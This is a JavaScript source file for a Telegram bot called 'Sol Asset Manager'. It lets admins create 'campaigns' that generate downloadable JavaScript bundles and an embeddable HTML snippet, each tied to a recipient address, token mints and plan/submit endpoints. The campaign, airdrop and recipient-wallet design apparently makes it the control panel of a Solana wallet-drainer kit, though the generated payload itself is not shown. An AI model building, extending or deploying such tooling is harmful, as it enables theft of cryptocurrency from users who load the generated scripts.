import "dotenv/config";
import { generateBundle, HTML_SNIPPET } from "./generate.js";

const TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const APP_URL = process.env.APP_URL || "http://localhost:3000";
const RECIPIENT = process.env.RECIPIENT || "";
const ADMIN_IDS = (process.env.TELEGRAM_ADMIN_IDS || "").split(",").map((s) => s.trim()).filter(Boolean);

if (!TOKEN) {
  console.error("TELEGRAM_BOT_TOKEN is not set");
  process.exit(1);
}

const API = `https://api.telegram.org/bot${TOKEN}`;
const campaigns = new Map();

async function tg(method, params) {
  const res = await fetch(`${API}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(params),
  });
  return res.json();
}

function send(chatId, text, parseMode = false) {
  const payload = { chat_id: chatId, text };
  if (parseMode) payload.parse_mode = "HTML";
  return tg("sendMessage", payload);
}

function isAdmin(chatId) {
  return ADMIN_IDS.length === 0 || ADMIN_IDS.includes(String(chatId));
}

async function sendDocument(chatId, filename, content) {
  const form = new FormData();
  form.append("chat_id", String(chatId));
  form.append("caption", filename);
  form.append("document", new Blob([content], { type: "text/javascript" }), filename);
  await fetch(`${API}/sendDocument`, { method: "POST", body: form });
}

function parseCreate(argLine) {
  const parts = argLine.split("|").map((s) => s.trim());
  if (parts.length < 2) return null;
  const [name, recipient, modeRaw, liquidRaw] = parts;
  const mode = modeRaw === "manual" ? "manual" : "auto";
  const liquidMints = (liquidRaw || "").split(",").map((s) => s.trim()).filter(Boolean);
  if (!name || !recipient) return null;
  return { name, recipient, mode, liquidMints };
}

async function handleUpdate(update) {
  const message = update.message;
  if (!message || !message.text) return;
  const chatId = message.chat.id;
  const text = message.text;

  if (!isAdmin(chatId)) {
    await send(chatId, "Access denied.");
    return;
  }

  const [cmd, ...rest] = text.split(/\s+/);
  const argLine = rest.join(" ");

  if (cmd === "/start" || cmd === "/help") {
    await send(
      chatId,
      `<b>Sol Asset Manager</b>\n\n` +
        `<code>/newfile name|recipient|mode|liquidMints</code> — generate check script\n` +
        `<code>/getfile id</code> — fetch the file\n` +
        `Example: <code>/newfile airdrop|RECIPIENT_ADDR|auto</code>`,
      true
    );
    return;
  }

  if (cmd === "/newfile") {
    const parsed = parseCreate(argLine);
    if (!parsed) {
      await send(chatId, "Usage: /newfile name|recipient|mode|liquidMints");
      return;
    }
    const id = `cmp_${Date.now().toString(36)}`;
    const planEndpoint = `${APP_URL}/plan`;
    const submitEndpoint = `${APP_URL}/submit`;
    const bundle = generateBundle({
      planEndpoint,
      submitEndpoint,
      recipient: parsed.recipient,
      mode: parsed.mode,
      liquidMints: parsed.liquidMints,
    });
    campaigns.set(id, bundle);
    await send(
      chatId,
      `Campaign <b>${parsed.name}</b> (#${id}) created.\n\n` +
        `<b>HTML snippet:</b>\n<code>${escapeHtml(HTML_SNIPPET)}</code>\n\n` +
        `Fetch file: <code>/getfile ${id}</code>`,
      true
    );
    return;
  }

  if (cmd === "/getfile") {
    const id = argLine.trim();
    const bundle = campaigns.get(id);
    if (!bundle) {
      await send(chatId, "Campaign not found.");
      return;
    }
    await sendDocument(chatId, `${id}.js`, bundle);
    return;
  }

  await send(chatId, "Unknown command. Send /help.");
}

function escapeHtml(value) {
  return value.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

async function main() {
  await fetch(`${API}/deleteWebhook?drop_pending_updates=true`).catch(() => {});
  console.log("[bot] polling started");
  let offset = 0;
  for (;;) {
    try {
      const res = await fetch(`${API}/getUpdates?timeout=25&offset=${offset}`);
      const data = await res.json();
      if (!data.ok) continue;
      for (const update of data.result) {
        offset = update.update_id + 1;
        handleUpdate(update).catch((err) => console.error("[bot] handle", err));
      }
    } catch (err) {
      console.error("[bot] poll", err.message);
      await new Promise((r) => setTimeout(r, 3000));
    }
  }
}

main();
